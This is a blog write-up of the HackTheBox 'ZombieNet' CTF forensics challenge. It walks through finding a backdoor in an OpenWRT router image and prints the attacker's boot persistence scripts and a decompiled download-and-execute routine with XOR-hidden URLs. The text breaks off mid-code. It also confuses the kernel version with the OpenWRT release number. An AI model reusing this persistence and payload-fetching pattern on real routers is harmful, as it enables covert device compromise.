<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
<head>
    










    







<script defer language="javascript" type="text/javascript" src="/js/bundle.min.145453261a7755f5042a854c4213501d215a8fbe34c08d181c40f803f1315e74.js"></script>






    
    <meta http-equiv="content-type" content="text/html; charset=utf-8">

    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    
    <link rel="icon" href=/favicon.png>

    
    





  





  
  
  


<!-- Open Graph image and Twitter Card metadata -->

<title itemprop="name">Jeremy&#39;s Blog - HackTheBox University CTF 2023 - ZombieNet</title>
<meta property="og:title" content=Jeremy&#39;s&#32;Blog&#32;-&#32;HackTheBox&#32;University&#32;CTF&#32;2023&#32;-&#32;ZombieNet />
<meta name="twitter:title" content=Jeremy&#39;s&#32;Blog&#32;-&#32;HackTheBox&#32;University&#32;CTF&#32;2023&#32;-&#32;ZombieNet />
<meta itemprop="name" content=Jeremy&#39;s&#32;Blog&#32;-&#32;HackTheBox&#32;University&#32;CTF&#32;2023&#32;-&#32;ZombieNet />
<meta name="application-name" content=Jeremy&#39;s&#32;Blog&#32;-&#32;HackTheBox&#32;University&#32;CTF&#32;2023&#32;-&#32;ZombieNet />
<meta property="og:site_name" content="" />


<meta name="description" content="" />
<meta itemprop="description" content="" />
<meta property="og:description" content="" />
<meta name="twitter:description" content="" />


<base href="/posts/writeups/2023/htb-uni-ctf/zombienet/" />
<link rel="canonical" href="/posts/writeups/2023/htb-uni-ctf/zombienet/" itemprop="url" />
<meta name="url" content="/posts/writeups/2023/htb-uni-ctf/zombienet/" />
<meta name="twitter:url" content="/posts/writeups/2023/htb-uni-ctf/zombienet/" />
<meta property="og:url" content="/posts/writeups/2023/htb-uni-ctf/zombienet/" />


<meta property="og:updated_time" content="2023-10-17T11:23:50-05:00" />


<link rel="sitemap" type="application/xml" title="Sitemap" href='/sitemap.xml' />

<meta name="robots" content="index,follow" />
<meta name="googlebot" content="index,follow" />



<meta property="fb:admins" content="" />


<meta name="apple-mobile-web-app-title" content="" />
<meta name="apple-mobile-web-app-capable" content="yes" />
<meta name="apple-mobile-web-app-status-bar-style" content="black" />






<meta name="generator" content="Hugo 0.138.0">


    
    

<link type="text/css" rel="stylesheet" href="/css/bundle.min.94a339836f89f0d25f31980cb6b0631da21e20af128308747ce44e0525eb16ef.css">


    
    <style>
    body {
        --sidebar-bg-color: #202020;
        --sidebar-img-border-color: #515151;
        --sidebar-p-color: #909090;
        --sidebar-h1-color: #FFF;
        --sidebar-a-color: #FFF;
        --sidebar-socials-color: #FFF;
        --text-color: #222;
        --bkg-color: #FAF9F6;
        --post-title-color: #303030;
        --list-color: #5A5A5A;
        --link-color: #268BD2;
        --date-color: #515151;
        --table-border-color: #E5E5E5;
        --table-stripe-color: #F9F9F9;
        --code-color: #000;
        --code-background-color: #E5E5E5;
        --code-block-color: #FFF;
        --code-block-background-color: #272822;
        --moon-sun-color: #FFF;
        --moon-sun-background-color: #515151;
    }
    body.dark-theme {
        --text-color: #EEE;
        --bkg-color: #121212;
        --post-title-color: #DBE2E9;
        --list-color: #9D9D9D;
        --link-color: #268BD2;
        --date-color: #9A9A9A;
        --table-border-color: #515151;
        --table-stripe-color: #202020;
        --code-color: #FFF;
        --code-background-color: #515151;
        --code-block-color: #FFF;
        --code-block-background-color: #272822;
    }
    body {
        background-color: var(--bkg-color);
    }
</style>

</head>

    <body class="">
        <div class="wrapper">
            <aside class="sidebar">
    <div class="container sidebar-sticky">
        <div class="light-dark" align="right">
    <button class="btn-light-dark" title="Toggle light/dark mode">
        <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
            <path fill="currentColor" d="M6 .278a.768.768 0 0 1 .08.858a7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277c.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316a.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71C0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
        </svg>
        <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
            <path fill="currentColor" d="M8 12a4 4 0 1 0 0-8a4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/>
        </svg>
    </button>
</div>

        <div class="sidebar-about">
    <h1 class="brand">
        
            <a href="/">
                <img src="/images/avatar.png" alt="brand image">
            </a>
        
        
            <a href="/">
                <h1>Jeremy&#39;s Blog</h1>
            </a>
        
    </h1>
    <p class="lead">
    Imagination is the only weapon in the war with reality.
    </p>
</div>

        <nav>
    <ul class="sidebar-nav">

        
        
        
        
            

            
                
                
            
            
                
                
            
                
                
                        
                
                        
                
            
        
        
            

            
                
                
                    <li class="heading">
                        <a href="/posts/">Posts</a>
                    </li>
                    
                
            
            
                
                
            
                
                
                        
                
                        
                
            
        

    </ul>
</nav>

        
    <a target="_blank" class="social" title="GitHub" href="https://github.com/stolenfootball">
        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="-2 -2 24 24">
            <path fill="currentColor" d="M18.88 1.099C18.147.366 17.265 0 16.233 0H3.746C2.714 0 1.832.366 1.099 1.099C.366 1.832 0 2.714 0 3.746v12.487c0 1.032.366 1.914 1.099 2.647c.733.733 1.615 1.099 2.647 1.099H6.66c.19 0 .333-.007.429-.02a.504.504 0 0 0 .286-.169c.095-.1.143-.245.143-.435l-.007-.885c-.004-.564-.006-1.01-.006-1.34l-.3.052c-.19.035-.43.05-.721.046a5.555 5.555 0 0 1-.904-.091a2.026 2.026 0 0 1-.872-.39a1.651 1.651 0 0 1-.572-.8l-.13-.3a3.25 3.25 0 0 0-.41-.663c-.186-.243-.375-.407-.566-.494l-.09-.065a.956.956 0 0 1-.17-.156a.723.723 0 0 1-.117-.182c-.026-.061-.004-.111.065-.15c.07-.04.195-.059.378-.059l.26.04c.173.034.388.138.643.311a2.1 2.1 0 0 1 .631.677c.2.355.44.626.722.813c.282.186.566.28.852.28c.286 0 .533-.022.742-.065a2.59 2.59 0 0 0 .585-.196c.078-.58.29-1.028.637-1.34a8.907 8.907 0 0 1-1.333-.234a5.314 5.314 0 0 1-1.223-.507a3.5 3.5 0 0 1-1.047-.872c-.277-.347-.505-.802-.683-1.365c-.177-.564-.266-1.215-.266-1.952c0-1.049.342-1.942 1.027-2.68c-.32-.788-.29-1.673.091-2.652c.252-.079.625-.02 1.119.175c.494.195.856.362 1.086.5c.23.14.414.257.553.352a9.233 9.233 0 0 1 2.497-.338c.859 0 1.691.113 2.498.338l.494-.312a6.997 6.997 0 0 1 1.197-.572c.46-.174.81-.221 1.054-.143c.39.98.424 1.864.103 2.653c.685.737 1.028 1.63 1.028 2.68c0 .737-.089 1.39-.267 1.957c-.177.568-.407 1.023-.689 1.366a3.65 3.65 0 0 1-1.053.865c-.42.234-.828.403-1.223.507a8.9 8.9 0 0 1-1.333.235c.45.39.676 1.005.676 1.846v3.11c0 .147.021.266.065.357a.36.36 0 0 0 .208.189c.096.034.18.056.254.064c.074.01.18.013.318.013h2.914c1.032 0 1.914-.366 2.647-1.099c.732-.732 1.099-1.615 1.099-2.647V3.746c0-1.032-.367-1.914-1.1-2.647z"/>
        </svg>
    </a>



    <a target="_blank" class="social" title="LinkedIn" href="https://www.linkedin.com/in/jeremy-dunn-a0b945172/">
        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 448 512">
            <path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5c0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7c-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5c67.2 0 79.7 44.3 79.7 101.9V416z"/>
        </svg>
    </a>







    <a target="_blank" class="social" title="Discord" href="https://discordapp.com/users/stolenfootball#3265">
        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 24 24">
            <path fill="currentColor" d="M19.27 5.33C17.94 4.71 16.5 4.26 15 4a.09.09 0 0 0-.07.03c-.18.33-.39.76-.53 1.09a16.09 16.09 0 0 0-4.8 0c-.14-.34-.35-.76-.54-1.09c-.01-.02-.04-.03-.07-.03c-1.5.26-2.93.71-4.27 1.33c-.01 0-.02.01-.03.02c-2.72 4.07-3.47 8.03-3.1 11.95c0 .02.01.04.03.05c1.8 1.32 3.53 2.12 5.24 2.65c.03.01.06 0 .07-.02c.4-.55.76-1.13 1.07-1.74c.02-.04 0-.08-.04-.09c-.57-.22-1.11-.48-1.64-.78c-.04-.02-.04-.08-.01-.11c.11-.08.22-.17.33-.25c.02-.02.05-.02.07-.01c3.44 1.57 7.15 1.57 10.55 0c.02-.01.05-.01.07.01c.11.09.22.17.33.26c.04.03.04.09-.01.11c-.52.31-1.07.56-1.64.78c-.04.01-.05.06-.04.09c.32.61.68 1.19 1.07 1.74c.03.01.06.02.09.01c1.72-.53 3.45-1.33 5.25-2.65c.02-.01.03-.03.03-.05c.44-4.53-.73-8.46-3.1-11.95c-.01-.01-.02-.02-.04-.02zM8.52 14.91c-1.03 0-1.89-.95-1.89-2.12s.84-2.12 1.89-2.12c1.06 0 1.9.96 1.89 2.12c0 1.17-.84 2.12-1.89 2.12zm6.97 0c-1.03 0-1.89-.95-1.89-2.12s.84-2.12 1.89-2.12c1.06 0 1.9.96 1.89 2.12c0 1.17-.83 2.12-1.89 2.12z"/>
        </svg>
    </a>










    <a target="_blank" class="social" title="Email" href="mailto:jeremy.dunn315@gmail.com">
       <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 485.211 485.211">
            <path fill="currentColor" d="M301.393,241.631L464.866,424.56H20.332l163.474-182.928l58.801,51.443L301.393,241.631z M462.174,60.651H23.027 l219.579,192.142L462.174,60.651z M324.225,221.67l160.986,180.151V80.792L324.225,221.67z M0,80.792v321.029L160.972,221.64 L0,80.792z"/>
       </svg>
    </a>



    <a target="_blank" class="social" title="Signal" href="https://signal.me/#eu/ikkgt8MQoJBTjgrVAOrULsPwxu8mSjGsPrW-GDGj5euZreghZMlJUb91ncEA4LQr">
        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.4em" viewBox="0 0 1024 1024">
            <path fill="currentColor" d="M427.5,170.3l7.9,32A319.6,319.6,0,0,0,347,238.9l-16.9-28.3A347.6,347.6,0,0,1,427.5,170.3Zm169,0-7.9,32A319.6,319.6,0,0,1,677,238.9l17.1-28.3A350.1,350.1,0,0,0,596.5,170.3ZM210.6,330a349.5,349.5,0,0,0-40.3,97.5l32,7.9A319.6,319.6,0,0,1,238.9,347ZM193,512a318.5,318.5,0,0,1,3.6-47.8l-32.6-5a352,352,0,0,0,0,105.5l32.6-4.9A319.5,319.5,0,0,1,193,512ZM693.9,813.3,677,785.1a317.8,317.8,0,0,1-88.3,36.6l7.9,32A350.3,350.3,0,0,0,693.9,813.3ZM831,512a319.5,319.5,0,0,1-3.6,47.8l32.6,4.9a352,352,0,0,0,0-105.5l-32.6,5A318.5,318.5,0,0,1,831,512Zm22.7,84.4-32-7.9A319,319,0,0,1,785.1,677l28.3,17A348.9,348.9,0,0,0,853.7,596.4Zm-293.9,231a319.1,319.1,0,0,1-95.6,0L459.3,860a351.3,351.3,0,0,0,105.4,0Zm209-126.2a318.1,318.1,0,0,1-67.6,67.5l19.6,26.6A355.1,355.1,0,0,0,795.4,721Zm-67.6-446a318.6,318.6,0,0,1,67.6,67.6L795.4,303A354.6,354.6,0,0,0,721,228.6Zm-446,67.6a318.6,318.6,0,0,1,67.6-67.6L303,228.6A354.6,354.6,0,0,0,228.6,303ZM813.4,330l-28.3,17a317.8,317.8,0,0,1,36.6,88.3l32-7.9A348.9,348.9,0,0,0,813.4,330ZM464.2,196.6a319.1,319.1,0,0,1,95.6,0l4.9-32.6a351.3,351.3,0,0,0-105.4,0ZM272.1,804.1,204,819.9l15.9-68.1-32.1-7.5-15.9,68.1a33,33,0,0,0,24.6,39.7,34.5,34.5,0,0,0,15,0l68.1-15.7Zm-77.5-89.2,32.2,7.4,11-47.2a316.2,316.2,0,0,1-35.5-86.6l-32,7.9a353.3,353.3,0,0,0,32.4,83.7Zm154,71.4-47.2,11,7.5,32.2,34.7-8.1a349,349,0,0,0,83.7,32.4l7.9-32a316.7,316.7,0,0,1-86.3-35.7ZM512,226c-158,.1-285.9,128.2-285.9,286.1a286.7,286.7,0,0,0,43.9,152L242.5,781.5,359.8,754c133.7,84.1,310.3,44,394.4-89.6S798.3,354.2,664.7,270A286.7,286.7,0,0,0,512,226s"/>
        </svg>
    </a>


        <p class="footnote">
powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a target="_blank" href="https://github.com/lukeorth/poison">poison</a>
    <br>
    &copy; 2025 . All rights reserved.
</p>

  </div>
</aside>

            <main class="content container">
                <div class="post">
  <div class="info">
  <h1 class="post-title">
    <a href="/posts/writeups/2023/htb-uni-ctf/zombienet/">HackTheBox University CTF 2023 - ZombieNet</a>
  </h1>

  <div class="headline">
    <div>
      
      
      <time datetime=" 2023-10-17T11:23:50-0500" class="post-date">
        October 17, 2023
      </time>
      
      <span> - </span>
      <span class="reading-time">
        
          
        

        <span>10 mins read</span>
      </span>
    </div>

    
    <ul class="tags">
      
      <li class="tag-writeups">
        <a href="/tags/writeups">writeups</a>
      </li>
      
      <li class="tag-dfir">
        <a href="/tags/dfir">dfir</a>
      </li>
      
    </ul>
    
  </div>

  
  

  
</div>

  <p>The second forensics challenge for HackTheBox University CTF 2023 was called ZombieNet.  It gave participants an image of an OpenWRT router, and asked them to determine how the attackers were maintaining persistent access to the device.  This post will walk through the steps I took to solve the challenge.</p>
<h2 id="challenge-description">Challenge Description</h2>
<p>There was an attack on the NOC (Network Operations Center) of Hackster University and as a result, a large number of Network devices were compromised! After successfully fending off the attack the devices were decommissioned and sent off to be inspected. However, there is a strong suspicion among your peers that not all devices were identified! They suspect that the attackers managed to maintain access to the network despite our team&rsquo;s efforts! It&rsquo;s your job to investigate a recently used disk image and uncover how the Zombies maintain their access!</p>
<h2 id="the-image">The Image</h2>
<p>The image provided was a small disk image file called <code>openwrt-ramips-mt7621-xiaomi_mi-router-4a-gigabit-squashfs-sysupgrade.bin</code>. I first attempted to analyze the image using Autopsy and TheSleuthKit, but they were unable to handle the binary firmware image.  I then used <code>binwalk</code> to extract the contents of the image, and found a full Linux filesystem.</p>
<p><img src="./images/1-router_filesystem.png" alt="Router Filesystem"></p>
<p>I began by trying to manually review the filesystem for anomalies, but with the large number of files and directories within the image, I quickly decided to take a different approach.</p>
<p>The main draw of <code>binwalk</code> is that it has the ability to perform signature scanning on a file - that is, it can search for magic numbers and other signatures that indicate the presence of a particular file type.  That is how it was able to retrieve all of the above files from the image.</p>
<p>But the <code>binwalk</code> signature scanning capabilities are not limited to just files it finds within the image - it can also analyze the image itself to determine the signature of the firmware.</p>
<p>Running <code>binwalk</code> without the <code>-e</code> flag will perform a signature scan on the image, and return the results.</p>
<p><img src="./images/2-binwalk_signature.png" alt="Binwalk Signature Scan"></p>
<p>As I highlighted in the image, this is a <!-- raw HTML omitted -->MIPS OpenWrt Linux-5.15.137<!-- raw HTML omitted --> image.  And from the name of the file, we know the exact version of OpenWRT that was used to create the image.  This is important, because it means we can download the source code for that version of OpenWRT, and compare the two to determine which changes were made in the image supplied to us.  If we can figure out what is different, the list of potentially malicious files to review will be much smaller.</p>
<p>After a quick Google search, I found the following site: <a href="https://openwrt.org/inbox/toh/xiaomi/xiaomi_mi_router_4a_gigabit_edition" target="_blank">https://openwrt.org/inbox/toh/xiaomi/xiaomi_mi_router_4a_gigabit_edition</a>, which contains a link to a firmware image for this exact same router.  The link is:</p>
<p><a href="https://downloads.openwrt.org/releases/23.05.0/targets/ramips/mt7621/openwrt-23.05.0-ramips-mt7621-xiaomi_mi-router-4a-gigabit-squashfs-sysupgrade.bin" target="_blank">https://downloads.openwrt.org/releases/23.05.0/targets/ramips/mt7621/openwrt-23.05.0-ramips-mt7621-xiaomi_mi-router-4a-gigabit-squashfs-sysupgrade.bin</a></p>
<p>This is close, but not the exact same image.  This is version 23.05.0, whereas the image we were given, as indicated by <code>binwalk</code>, is 23.05.137.  Although the link to version 23.05.137 doesn&rsquo;t appear to be listed, I was able to find it by modifying the URL slightly:</p>
<p><a href="https://downloads.openwrt.org/releases/23.05.137/targets/ramips/mt7621/openwrt-23.05.137-ramips-mt7621-xiaomi_mi-router-4a-gigabit-squashfs-sysupgrade.bin" target="_blank">https://downloads.openwrt.org/releases/23.05.137/targets/ramips/mt7621/openwrt-23.05.137-ramips-mt7621-xiaomi_mi-router-4a-gigabit-squashfs-sysupgrade.bin</a></p>
<p>Next, I extracted the contents of the two images, and used the <code>diff</code> command with the <code>-r</code> flag to recursively compare the directories, and the <code>-q</code> to only output the files that were different.  Then, I used <code>grep</code> to filter by files that only appeared in the modified image we were given.  The command I used was:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>diff -qr _openwrt-image-original/ factory_images/_openwrt-image-factory/ | grep <span style="color:#e6db74">&#34;Only in _openwrt&#34;</span>
</span></span></code></pre></div><p><img src="./images/3-diff_results.png" alt="Output of command"></p>
<p>There are a number of suspicious files in this list, but one stands out: <!-- raw HTML omitted -->/etc/rc.d/S95dead-reanimation<!-- raw HTML omitted -->.  This is a startup script that will be executed when the router boots up; it is clearly not standard, and is also themed like the rest of the CTF.</p>
<h2 id="dead-reanimation">dead-reanimation</h2>
<p>The <code>S95dead-reanimation</code> script is actually an OpenRC startup script, which is a symbolic link that runs another script whenever the router starts.  This is a well known feature of how OpenRC works, but we can confirm it by looking at the contents of the <code>/etc/rc.d</code> directory:</p>
<p><img src="./images/4-openrc_startup_script.png" alt="OpenRC Startup Script"></p>
<p>Let&rsquo;s look at the script this link points to, <code>/etc/init.d/dead-reanimation</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/sh /etc/rc.common
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>START<span style="color:#f92672">=</span><span style="color:#ae81ff">95</span>
</span></span><span style="display:flex;"><span>USE_PROCD<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>PROG<span style="color:#f92672">=</span>/sbin/zombie_runner
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>start_service<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>	procd_open_instance
</span></span><span style="display:flex;"><span>	procd_set_param command $PROG
</span></span><span style="display:flex;"><span>	procd_set_param respawn <span style="color:#e6db74">${</span>respawn_threshold<span style="color:#66d9ef">:-</span>3600<span style="color:#e6db74">}</span> <span style="color:#e6db74">${</span>respawn_timeout<span style="color:#66d9ef">:-</span>5<span style="color:#e6db74">}</span> <span style="color:#e6db74">${</span>respawn_retry<span style="color:#66d9ef">:-</span>5<span style="color:#e6db74">}</span>
</span></span><span style="display:flex;"><span>	procd_close_instance
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span> 
</span></span></code></pre></div><p>This is simple service script, which runs <code>/sbin/zombie_runner</code> on boot. Let&rsquo;s look at <code>/sbin/zombie_runner</code> next:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/sh
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#f92672">[</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">do</span> 
</span></span><span style="display:flex;"><span>    /usr/bin/dead-reanimation
</span></span><span style="display:flex;"><span>    sleep <span style="color:#ae81ff">600</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>exit <span style="color:#ae81ff">0</span>
</span></span></code></pre></div><p>This script is also simple - it runs <code>/usr/bin/dead-reanimation</code> every 10 minutes.  When we go to investigate this script, we find that it is a binary file, which can be seen with the <code>file</code> command:</p>
<p><img src="./images/5-dead_reanimation_binary.png" alt="Dead Reanimation Binary"></p>
<p>We know that the binary is a MIPS32 binary from the output of the <code>file</code> command.  The next step is to load it into Ghidra, and analyze it.  Once auto-analysis is complete, we can follow the calls from the entry point to determine what the binary does.</p>
<p>The first interesting function is <code>FUN_00400cf</code>, which looks as follows:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>undefined4 <span style="color:#a6e22e">FUN_00400cf4</span>(<span style="color:#66d9ef">void</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar1;
</span></span><span style="display:flex;"><span>  undefined4 local_a8;
</span></span><span style="display:flex;"><span>  undefined4 local_a4;
</span></span><span style="display:flex;"><span>  undefined4 local_a0;
</span></span><span style="display:flex;"><span>  undefined4 local_9c;
</span></span><span style="display:flex;"><span>  undefined4 local_98;
</span></span><span style="display:flex;"><span>  undefined local_94;
</span></span><span style="display:flex;"><span>  undefined4 local_90;
</span></span><span style="display:flex;"><span>  undefined4 local_8c;
</span></span><span style="display:flex;"><span>  undefined4 local_88;
</span></span><span style="display:flex;"><span>  undefined4 local_84;
</span></span><span style="display:flex;"><span>  undefined2 local_80;
</span></span><span style="display:flex;"><span>  undefined auStack_7c [<span style="color:#ae81ff">60</span>];
</span></span><span style="display:flex;"><span>  undefined auStack_40 [<span style="color:#ae81ff">56</span>];
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  local_a8 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x9a6f65f0</span>;
</span></span><span style="display:flex;"><span>  local_a4 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xadf4e47e</span>;
</span></span><span style="display:flex;"><span>  local_a0 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4e937069</span>;
</span></span><span style="display:flex;"><span>  local_9c <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x8ec5e155</span>;
</span></span><span style="display:flex;"><span>  local_98 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3af55fc1</span>;
</span></span><span style="display:flex;"><span>  local_94 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  local_90 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x9a6f65f0</span>;
</span></span><span style="display:flex;"><span>  local_8c <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xadf4f27e</span>;
</span></span><span style="display:flex;"><span>  local_88 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4a8c4663</span>;
</span></span><span style="display:flex;"><span>  local_84 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x9082ea40</span>;
</span></span><span style="display:flex;"><span>  local_80 <span style="color:#f92672">=</span> <span style="color:#ae81ff">200</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memcpy</span>(auStack_7c,<span style="color:#f92672">&amp;</span>DAT_00400f74,<span style="color:#ae81ff">0x3a</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memcpy</span>(auStack_40,<span style="color:#f92672">&amp;</span>DAT_00400fb0,<span style="color:#ae81ff">0x37</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_00400c04</span>(<span style="color:#f92672">&amp;</span>local_a8);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_00400c04</span>(<span style="color:#f92672">&amp;</span>local_90);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_00400c04</span>(auStack_7c);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_00400c04</span>(auStack_40);
</span></span><span style="display:flex;"><span>  iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">access</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>local_a8,<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">FUN_00400b20</span>(auStack_7c,<span style="color:#f92672">&amp;</span>local_a8);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">chmod</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>local_a8,<span style="color:#ae81ff">0x1ff</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">access</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>local_90,<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">FUN_00400b20</span>(auStack_40,<span style="color:#f92672">&amp;</span>local_90);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">chmod</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>local_90,<span style="color:#ae81ff">0x1ff</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">system</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>local_90);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">system</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>local_a8);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>After renaming a few variables and removing some of the Ghidra decompilation artifacts, the function looks like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">downloadAndExecute</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memcpy</span>(file_1,<span style="color:#f92672">&amp;</span>DAT_00400f74,<span style="color:#ae81ff">0x3a</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memcpy</span>(file_2,<span style="color:#f92672">&amp;</span>DAT_00400fb0,<span style="color:#ae81ff">0x37</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xor</span>(<span style="color:#f92672">&amp;</span>url_1);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xor</span>(<span style="color:#f92672">&amp;</span>url_2);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xor</span>(file_1);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xor</span>(file_2);
</span></span><span style="display:flex;"><span>    iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">access</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>url_1,<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
